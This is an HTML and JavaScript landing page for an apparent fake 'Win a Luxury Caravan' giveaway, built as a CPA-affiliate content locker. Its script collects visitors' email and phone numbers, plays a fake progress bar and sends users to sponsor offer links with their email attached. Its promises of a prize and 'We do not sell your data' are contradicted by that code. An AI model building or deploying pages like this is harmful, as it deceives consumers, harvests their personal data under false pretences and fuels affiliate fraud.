<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <!-- Prevent iOS auto-zoom on inputs and ensure responsive scale -->
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Win a Luxury Caravan — Premium Giveaway</title>
  <meta name="description" content="Enter to win a $45,000 luxury caravan. Complete one quick sponsor email registration (30–90s). No purchase required.">
  <meta name="theme-color" content="#071025">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">

  <style>
    /* Global */
    :root{
      --bg:#041226;          /* deep midnight */
      --panel:#0b1630;       /* card panel */
      --muted:#9fb0bf;
      --heading:#f6f7f9;
      --gold:#f6c85f;        /* accent */
      --accent:#6be3d6;      /* secondary accent */
      --glass: rgba(255,255,255,0.03);
      --radius:12px;
      --maxw:760px;          /* narrow for mobile comfort */
      --safe-padding:16px;
    }
    html,body{
      height:100%;
      margin:0;
      font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background:linear-gradient(180deg,var(--bg),#021222);
      color:var(--heading);
      -webkit-font-smoothing:antialiased;
      -webkit-text-size-adjust:100%; /* important: avoid iOS auto-zoom */
    }
    *,*::before,*::after{box-sizing:border-box}
    img{display:block;max-width:100%;height:auto}
    a{color:inherit;text-decoration:none}

    /* Wrapper */
    .wrap{max-width:var(--maxw);margin:12px auto;padding:var(--safe-padding)}

    /* Header compact */
    .header{
      display:flex;
      gap:12px;
      align-items:center;
      justify-content:space-between;
      padding:10px;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.03);
      position:sticky;
      top:8px;
      z-index:40;
      backface-visibility:hidden;
    }
    .brand{display:flex;gap:10px;align-items:center}
    .logo{
      width:44px;height:44px;border-radius:10px;object-fit:cover;border:1px solid rgba(255,255,255,0.04);
      background:linear-gradient(90deg,#0b2a3a,#021426);
      display:inline-block;
    }
    .title{
      font-size:15px;
      line-height:1;
      font-weight:700;
      color:var(--heading);
    }
    .nav-compact{
      display:flex;gap:10px;align-items:center;font-size:13px;color:var(--muted)
    }
    .nav-compact a{padding:8px;border-radius:8px}
    .nav-compact a:hover{color:var(--gold)}

    /* Hero card - condensed for mobile preview */
    .hero{
      margin-top:12px;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:14px;
      padding:18px;
      border:1px solid rgba(255,255,255,0.03);
      box-shadow: 0 8px 28px rgba(2,8,20,0.35);
    }
    .kicker{
      display:inline-block;
      background:linear-gradient(90deg,var(--gold),#ffd98e);
      color:#061018;
      padding:8px 12px;border-radius:999px;font-weight:800;font-size:12px;
      margin-bottom:12px;
      box-shadow: 0 6px 18px rgba(246,200,95,0.06);
    }
    h1{
      margin:4px 0 8px 0;
      font-size:22px;
      line-height:1.02;
      letter-spacing:-0.2px;
      color:var(--heading);
      font-weight:800;
    }
    p.lead{
      margin:0 0 14px 0;
      color:var(--muted);
      font-size:14px;
      line-height:1.45;
    }

    /* CTA row - single primary, small secondary */
    .cta-row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
    .btn-primary{
      background:linear-gradient(90deg,var(--gold),#ffd88f);
      color:#031018;
      padding:12px 14px;border-radius:999px;border:none;font-weight:800;font-size:15px;
      box-shadow:0 12px 36px rgba(246,200,95,0.12);
      flex: 1;
      min-width:180px;
      text-align:center;
    }
    .btn-secondary{
      background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted);
      padding:10px 12px;border-radius:10px;font-size:14px;
    }

    /* summary boxes */
    .summary{display:flex;gap:12px;color:var(--muted);font-size:13px;flex-wrap:wrap;margin-bottom:12px}
    .summary .item{min-width:80px}

    /* features - stacked cards (good mobile scan) */
    .features{display:flex;flex-direction:column;gap:10px;margin-top:8px}
    .feature{background:var(--panel);padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,0.02);color:var(--muted)}
    .feature strong{display:block;color:var(--heading);margin-bottom:6px;font-weight:700}

    /* hero sticky CTA - large pill at bottom for mobile (not duplicate on hero) */
    .sticky{
      position:fixed;left:50%;transform:translateX(-50%);bottom:16px;z-index:90;
      width:calc(100% - 32px);max-width:720px;
      background:linear-gradient(90deg,var(--gold),#ffd88f);color:#081014;padding:12px 14px;border-radius:999px;border:none;font-weight:800;box-shadow:0 16px 44px rgba(246,200,95,0.12);
      display:none;
      text-align:center;
    }
    @media (max-width:980px){ .sticky{display:block} }

    /* modal (locker) - full screen for mobile */
    .modal-back{
      position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,8,20,0.7);z-index:120;padding:12px;
    }
    .modal{
      width:100%;max-width:520px;background:linear-gradient(180deg,#061626,#02101a);border-radius:14px;padding:18px;border:1px solid rgba(255,255,255,0.03);
      color:var(--heading);
    }
    .modal h3{margin:4px 0;color:var(--gold)}
    .modal p{color:var(--muted);font-size:14px;margin:0 0 10px 0}
    input[type="email"], input[type="tel"]{
      width:100%;padding:12px 14px;border-radius:12px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:var(--heading);font-size:16px;margin-top:8px;
    }
    .modal .row{display:flex;gap:10px;margin-top:12px}
    .offer{display:flex;justify-content:space-between;align-items:center;padding:12px;border-radius:12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));margin-top:10px;cursor:pointer}
    .progress{height:8px;background:rgba(255,255,255,0.03);border-radius:8px;margin-top:12px;overflow:hidden}
    .progress span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--gold),#ffd88f);transition:width .35s}
    .small{font-size:13px;color:var(--muted);}

    /* accessibility */
    button{min-height:44px;touch-action:manipulation}
  </style>
</head>
<body>
  <div class="wrap" role="document">

    <!-- compact header -->
    <header class="header" role="banner">
      <div class="brand" aria-hidden="false">
        <div class="logo" aria-hidden="true">
          <img src="https://i.postimg.cc/Nj2Yjk8w/frankia-now-sun-g24-01-630x420.jpg" alt="" style="width:44px;height:44px;border-radius:10px;object-fit:cover;">
        </div>
        <div>
          <div class="title">Luxury Caravan Giveaway</div>
          <small class="small" style="color:var(--muted)">Win a $45,000 premium caravan</small>
        </div>
      </div>

      <nav class="nav-compact" aria-label="top navigation">
        <a href="#features">Features</a>
        <a href="#testimonials">Winners</a>
        <a href="#terms">Terms</a>
      </nav>
    </header>

    <!-- hero -->
    <section class="hero" role="main" aria-labelledby="heroHeading">
      <div>
        <div class="kicker">LIMITED ENTRY • FREE</div>
        <h1 id="heroHeading">Win a Luxury Caravan — Quick 2‑Step Entry</h1>
        <p class="lead">Complete one sponsor email registration (~30–90s) to get an instant entry. No purchase necessary. Use valid info to qualify.</p>

        <div class="cta-row">
          <!-- single clear CTA in hero; sticky CTA at bottom for persistent access -->
          <button id="openLocker" class="btn-primary" aria-haspopup="dialog">Enter Giveaway — Start</button>
          <button id="howItWorks" class="btn-secondary">How it works</button>
        </div>

        <div class="summary" aria-hidden="false">
          <div class="item"><strong>$45,000</strong><small>Prize value</small></div>
          <div class="item"><strong>1–3 min</strong><small>Avg completion</small></div>
          <div class="item"><strong>Secure</strong><small>Trusted sponsors</small></div>
        </div>

        <div class="features" id="features" aria-hidden="false">
          <div class="feature"><strong>Comfort for 6</strong><span>Spacious sleeping & living</span></div>
          <div class="feature"><strong>Full Kitchen</strong><span>Modern appliances</span></div>
          <div class="feature"><strong>Private Bath</strong><span>Shower, toilet & vanity</span></div>
        </div>
      </div>
    </section>

    <!-- sticky CTA for mobile -->
    <button id="stickyCTA" class="sticky" aria-label="Enter giveaway">Enter & Start →</button>

    <footer style="margin-top:20px;text-align:center;color:var(--muted)" id="terms">
      <small>© 2025 Your CPA Business • Promotion not affiliated with Google.</small>
    </footer>
  </div>

  <!-- locker modal -->
  <div id="locker" class="modal-back" aria-hidden="true" role="dialog" aria-modal="true">
    <div class="modal" role="document" aria-labelledby="lockerTitle">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <h3 id="lockerTitle">Quick Verification — Step 1</h3>
        <button id="closeLocker" class="btn-ghost" aria-label="Close">Close</button>
      </div>

      <p class="small">Enter your email so we can save your spot. You will then see trusted sponsor offers — complete one quick email registration (~30–90s) to confirm your entry.</p>

      <label class="small" for="leadEmail" style="margin-top:12px">Email</label>
      <input id="leadEmail" type="email" placeholder="you@example.com" autocomplete="email" inputmode="email">

      <label class="small" for="leadPhone" style="margin-top:8px">Phone (optional)</label>
      <input id="leadPhone" type="tel" placeholder="+1 555 555 5555" autocomplete="tel" inputmode="tel">

      <div class="row" style="margin-top:12px">
        <button id="saveLead" class="btn-primary" style="flex:1">Save & Continue</button>
        <button id="openOffers" class="btn-ghost" style="width:120px">Offers</button>
      </div>

      <div id="progressWrap" class="progress" style="display:none;">
        <span id="progressFill" style="width:0%"></span>
      </div>

      <div id="offers" class="offers" aria-live="polite" style="display:none;">
        <div class="small" style="margin-top:10px">Choose an offer and complete the sponsor registration to confirm your entry:</div>
        <div id="offersList" style="margin-top:8px"></div>
      </div>

      <div class="small" style="margin-top:12px">We only use your info to confirm your entry and for legitimate follow-up. We do not sell your data.</div>
    </div>
  </div>

  <script>
    /* ---------- CONFIG ----------
       Replace WEBHOOK_URL and SPONSORS below with your real endpoints.
    */
    const WEBHOOK_URL = ""; // e.g. "https://hooks.zapier.com/hooks/catch/XXXXX/YYYYY"
    const SPONSORS = [
      { title: "CTConnect — Cash App", url: "https://smrturl.co/a/sac7b66fcac/663?s1=" },
      { title: "CTConnect — Nike GiftCard", url: "https://smrturl.co/a/sac7b66fcac/14565?s1=" }
    ];

    /* ---------- Elements ---------- */
    const openLockerBtn = document.getElementById('openLocker');
    const openOffersBtn = document.getElementById('openOffers');
    const saveLeadBtn = document.getElementById('saveLead');
    const closeLockerBtn = document.getElementById('closeLocker');
    const locker = document.getElementById('locker');
    const leadEmail = document.getElementById('leadEmail');
    const leadPhone = document.getElementById('leadPhone');
    const offersEl = document.getElementById('offers');
    const offersList = document.getElementById('offersList');
    const progressWrap = document.getElementById('progressWrap');
    const progressFill = document.getElementById('progressFill');
    const stickyCTA = document.getElementById('stickyCTA');
    const howBtn = document.getElementById('howItWorks');

    /* ---------- Helpers ---------- */
    function isEmail(e){ return typeof e === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e.trim()); }
    function postJSON(url, body){ return fetch(url, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); }
    function appendS1(url, email){
      try{ const u = new URL(url); if(!u.searchParams.get('s1')) u.searchParams.set('s1', encodeURIComponent(email)); return u.toString(); } catch(e) { return url + encodeURIComponent(email); }
    }
    function openInNewTab(url){
      try{ const a = document.createElement('a'); a.href = url; a.target = '_blank'; a.rel = 'noopener noreferrer'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(e) { window.open(url, '_blank','noopener'); }
    }

    /* ---------- Modal behavior ---------- */
    function showLocker(){
      locker.style.display = 'flex';
      locker.setAttribute('aria-hidden','false');
      document.body.style.overflow = 'hidden';
      // small delay helps mobile keyboards avoid layout jank
      setTimeout(()=> leadEmail.focus(), 220);
    }
    function hideLocker(){
      locker.style.display = 'none';
      locker.setAttribute('aria-hidden','true');
      document.body.style.overflow = 'auto';
      resetOffersUI();
    }
    openLockerBtn && openLockerBtn.addEventListener('click', showLocker);
    stickyCTA && stickyCTA.addEventListener('click', showLocker);
    closeLockerBtn && closeLockerBtn.addEventListener('click', hideLocker);
    howBtn && howBtn.addEventListener('click', ()=> alert('1) Enter email 2) Choose an offer 3) Complete sponsor registration (~30–90s) to confirm entry.'));

    locker.addEventListener('click', (e)=> { if(e.target === locker) hideLocker(); });
    document.addEventListener('keydown', (e)=> { if(e.key === 'Escape' && locker.style.display === 'flex') hideLocker(); });

    /* ---------- Lead capture and offers ---------- */
    saveLeadBtn && saveLeadBtn.addEventListener('click', async ()=>{
      const email = (leadEmail.value || '').trim();
      const phone = (leadPhone.value || '').trim();
      if(!isEmail(email)){ leadEmail.focus(); leadEmail.style.borderColor = '#ffd88f'; return; }
      leadEmail.style.borderColor = '';

      const lead = { email, phone, ts: new Date().toISOString(), page: location.href };
      try{ localStorage.setItem('caravan_lead', JSON.stringify(lead)); } catch(e){}
      if(WEBHOOK_URL) { postJSON(WEBHOOK_URL, Object.assign({}, lead, { event: 'lead_saved' })).catch(()=>{}); }

      // visual progress then show offers
      showProgressThenOffers();
    });

    openOffersBtn && openOffersBtn.addEventListener('click', ()=>{
      const raw = localStorage.getItem('caravan_lead');
      if(!raw && !confirm('We recommend saving your email so your entry can be credited. Open offers without saving?')) return;
      renderOffers();
      offersEl.style.display = 'block';
    });

    function showProgressThenOffers(){
      progressWrap.style.display = 'block';
      offersEl.style.display = 'none';
      progressFill.style.width = '0%';
      let p = 0;
      const t = setInterval(()=> {
        p += Math.floor(10 + Math.random()*18);
        if(p > 100) p = 100;
        progressFill.style.width = p + '%';
        if(p >= 100){ clearInterval(t); progressWrap.style.display = 'none'; renderOffers(); offersEl.style.display = 'block'; }
      }, 130);
    }

    function renderOffers(){
      offersList.innerHTML = '';
      SPONSORS.forEach((s, idx) => {
        const el = document.createElement('div');
        el.className = 'offer';
        el.innerHTML = `<div><div style="font-weight:700">${s.title}</div><div class="small" style="color:var(--muted)">Email registration • Avg 1–3 min</div></div><div style="display:flex;gap:8px;align-items:center"><div style="font-size:12px;color:var(--muted)">${idx===0?'Recommended':'Popular'}</div><div style="background:linear-gradient(90deg,#00e5ff,#0099ff);color:#000;padding:8px 10px;border-radius:999px;font-weight:700">Open</div></div>`;
        el.addEventListener('click', ()=> selectOffer(s));
        offersList.appendChild(el);
      });
    }

    async function selectOffer(sponsor){
      let lead = null;
      try{ lead = JSON.parse(localStorage.getItem('caravan_lead') || 'null'); } catch(e){ lead = null; }
      if(!lead || !isEmail(lead.email)){ alert('Please save your email first so your entry is credited.'); return; }

      if(WEBHOOK_URL){ postJSON(WEBHOOK_URL, Object.assign({}, lead, { event:'offer_click', offer: sponsor.title, offer_url: sponsor.url, ts: new Date().toISOString() })).catch(()=>{}); }
      const redirect = appendS1(sponsor.url, lead.email);
      openInNewTab(redirect);

      setTimeout(()=> { alert('Offer opened in a new tab — complete the sponsor registration to confirm your entry.'); hideLocker(); }, 700);
    }

    function resetOffersUI(){ progressWrap.style.display = 'none'; progressFill.style.width = '0%'; offersEl.style.display = 'none'; offersList.innerHTML = ''; }

    // restore previous lead
    (function restoreLead(){ try{ const raw = localStorage.getItem('caravan_lead'); if(raw){ const p = JSON.parse(raw); if(p.email) leadEmail.value = p.email; if(p.phone) leadPhone.value = p.phone; } } catch(e){} })();

    // sticky CTA visibility: hide when keyboard likely open (visualViewport heuristic)
    (function stickyVisibility(){
      const s = document.getElementById('stickyCTA');
      function update(){
        if(window.visualViewport){
          if(window.visualViewport.height < screen.availHeight * 0.65) s.style.display = 'none';
          else s.style.display = window.matchMedia('(max-width:980px)').matches ? 'block' : 'none';
        } else {
          s.style.display = window.matchMedia('(max-width:980px)').matches ? 'block' : 'none';
        }
      }
      window.addEventListener('resize', update);
      window.addEventListener('orientationchange', update);
      window.addEventListener('focusin', update);
      window.addEventListener('focusout', update);
      update();
    })();

    // expose helpers for debugging
    window.__landing = { showLocker: showLocker, hideLocker: hideLocker, renderOffers: renderOffers };
  </script>
</body>
</html>
